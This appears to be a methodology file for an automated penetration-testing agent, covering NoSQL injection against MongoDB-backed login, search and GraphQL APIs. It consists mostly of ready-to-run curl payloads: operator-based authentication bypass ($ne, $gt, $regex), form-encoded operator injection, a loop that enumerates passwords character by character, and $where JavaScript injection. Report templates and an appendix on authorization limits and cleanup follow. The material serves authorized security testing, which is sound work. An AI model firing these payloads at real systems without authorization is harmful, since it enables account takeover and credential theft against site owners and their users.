# NoSQL Injection — Step-by-Step Methodology

## 1. Identify Injection Points

Target endpoints that accept JSON bodies or query strings that feed into NoSQL queries:

```bash
# Look for auth endpoints, search/filter endpoints, and lookup endpoints
grep -hE 'POST.*(login|signin|auth|search|filter|find|lookup|query)' \
  /workspace/api-routes-combined.txt | tee /workspace/nosqli-candidates.txt

# Also check GET endpoints with filter/where/query params
grep -hE 'GET.*(filter|where|query|search|id)=' \
  /workspace/api-routes-combined.txt >> /workspace/nosqli-candidates.txt
```

## 2. Authentication Bypass — MongoDB Operator Injection

The classic Mongoose auth pattern `User.findOne({username, password})` is vulnerable when inputs are not sanitized to strings:

```bash
TARGET="https://target.com/api/auth/login"

# $ne operator bypass — match any document where password is NOT "invalid"
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "invalid"}}' | \
  tee /workspace/nosqli-ne-result.json

# $gt bypass — match any document where password > "" (all non-empty)
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$gt": ""}}'

# $regex bypass — match any password
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": ".*"}}'

# Check for a valid session token or auth cookie in response
grep -iE 'token|cookie|session|jwt' /workspace/nosqli-ne-result.json
```

## 3. Form-Encoded Operator Injection

Some apps accept `application/x-www-form-urlencoded` and parse with `qs` which builds nested objects:

```bash
# qs-style nested operator (sends username[$ne]=x which qs parses as {username: {$ne: "x"}})
curl -s -X POST "https://target.com/api/auth/login" \
  -d "username[$ne]=invalid&password[$ne]=invalid"

# Also try array injection
curl -s -X POST "https://target.com/api/auth/login" \
  -d "username[$in][]=admin&username[$in][]=root&password[$ne]=x"
```

## 4. Data Enumeration via $regex

Once an operator is accepted, use `$regex` with anchors to enumerate values character-by-character:

```bash
TARGET="https://target.com/api/auth/login"

# Confirm admin account exists
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": "^admin"}, "password": {"$ne": "x"}}' | \
  grep -qi 'token\|success\|200' && echo "admin account found"

# Enumerate password characters for account
for char in a b c d e f 0 1 2 3 4 5 6 7 8 9; do
  result=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin\", \"password\": {\"\$regex\": \"^${char}\"}}")
  echo "$result" | grep -qi 'token\|success' && echo "Password starts with: $char"
done
```

## 5. $where JavaScript Injection

`$where` allows a JavaScript function in the query context — only enabled on older MongoDB or misconfigured clusters:

```bash
# Test if $where is accepted (look for different error vs operator injection)
curl -s -X POST "https://target.com/api/users/search" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"filter": {"$where": "this.username == \"admin\""}}'

# Time-based blind confirmation ($where executes)
# If response delays when sleep is injected — $where is live
curl -s -X POST "https://target.com/api/users/search" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"filter": {"$where": "function(){var t=new Date(); while(new Date()-t<3000){} return true;}"}}'
```

## 6. $in Enumeration and Privilege Discovery

```bash
# Probe for admin/privileged documents via $in on role field
curl -s "https://target.com/api/users?role[$in][]=admin&role[$in][]=superuser" \
  -H "Authorization: Bearer $TOKEN"

# $exists probe — confirm field exists on documents
curl -s -X POST "https://target.com/api/users/search" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"filter": {"adminToken": {"$exists": true}}}'
```

## 7. NoSQL Injection in GraphQL and REST Filter APIs

Some APIs expose MongoDB query operators directly through filter parameters:

```bash
# REST filter endpoint
curl -s "https://target.com/api/orders?filter={\"userId\":{\"\\$ne\":\"null\"}}" \
  -H "Authorization: Bearer $USER_A_TOKEN"

# GraphQL with NoSQL backend (inject operator in input type)
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users(filter: {role: {$ne: \"user\"}}) { email role } }"}'
```

## 8. Validation Criteria

| Indicator | Meaning |
|-----------|---------|
| Login returns session token with `$ne` / `$gt` payload | Auth bypass confirmed |
| `$regex` enumeration returns distinct matches per prefix | Data enumeration confirmed |
| `$where` causes timing difference | JS injection in query context |
| `$exists` returns extra fields | Field existence oracle |

Minimum evidence: full HTTP request/response pair showing auth bypass or unintended data returned.

## 9. Reporting Contract

```
# Auth bypass
report_finding(
  assetRef={kind: "domain", value: "target.com"},
  title="NoSQL Injection - MongoDB Operator Auth Bypass",
  severity="critical",
  summary="The login query accepts MongoDB operator objects. Supplying $ne in the password field bypasses authentication and returns a valid admin session token.",
  evidence=[{path: "evidence/nosql-auth-bypass.txt", label: "Authentication bypass", excerpt: "POST {\"username\":\"admin\",\"password\":{\"$ne\":\"x\"}} -> HTTP 200 {\"token\":\"eyJ...\"}"}]
)

# Enumeration
report_finding(
  assetRef={kind: "domain", value: "target.com"},
  title="NoSQL Injection - $regex Password Enumeration",
  severity="high",
  summary="The password field accepts the $regex operator, allowing character-by-character credential enumeration based on response differences.",
  evidence=[{path: "evidence/nosql-regex-enum.txt", label: "Enumeration responses", excerpt: "{\"password\":{\"$regex\":\"^a\"}} -> 200 OK; {\"password\":{\"$regex\":\"^b\"}} -> 401"}]
)

# $where confirmed but unexploited
report_note(
  ntype="approach.tried",
  data={
    technique: "nosql-injection-$where",
    endpoint: "POST https://target.com/api/users/search",
    result: "blocked",
    reason: "$where operator accepted and timing confirmed server-side JavaScript execution, but no data extraction or OOB confirmation was achieved."
  }
)
```

## B1 Existing-Package Contract

This appendix normalizes the existing package; the package-specific procedure above remains authoritative.

### Preconditions and Fast Applicability

Confirm the exact target or artifact is authorized, the package-specific input exists, and the earlier procedure's controls and quantitative limits can be met. Otherwise record not-applicable or blocked coverage.

### Surface Discovery and Prioritization

Start from durable inventory and prioritize only the surfaces named by this package. A technology, route, banner, or version string establishes inventory, not a vulnerability.

### Safe Test Ladder

Run the package's baseline first, then its smallest one-variable candidate and a matched negative control. Stop at proof, falsification, the package cap, or a missing prerequisite.

### Variation Matrix

Apply only variations justified by the observed parser, identity, state, transport, platform, or tool behavior. Change one dimension per replay and retain the invariant baseline.

### Proof Standard

Use the package-specific proof floor above. Scanner labels, generic errors, reflection, timing outliers, and source appearance remain leads unless the documented control and impact are reproduced.

### False Positives and Benign Lookalikes

Compare the candidate with a normal baseline, a syntax-neutral or nonexistent control, and any package-specific benign condition. Reject results that are equally explained by caching, rate limiting, intended public behavior, or unstable infrastructure.

### Missing Prerequisites and Blocked Behavior

Name the missing identity, state, protocol support, repository context, callback, or safe environment and the exact evidence that would unblock testing. Never convert blocked or ambiguous work into a finding.

### Tool Selection and Fallback

Use only the tools declared by this skill and prefer machine-readable, rate-bounded output. If the preferred tool is unavailable, use the package's documented fallback or stop; do not broaden permissions.

### Handoffs and Duplicate Prevention

Keep this package focused on its declared primitive. Reuse baseline and evidence identifiers when a related skill owns another protocol, platform, or final validation decision.

### Stop, Cleanup, and Data Minimization

Stop at the first sufficient proof or rejection. Remove evaluator-created state, expire callbacks, close special connections, redact secrets and personal data, and retain only the minimum reproducible evidence. Never perform destructive actions or expand beyond the authorized target.

Research date: 2026-07-23

## Sources

- Package-specific sources and references listed above.
- Locked B1 authoring and evaluation PRD: ../../../../../docs/prd/3.0/agent-skill-authoring-and-evaluation.md
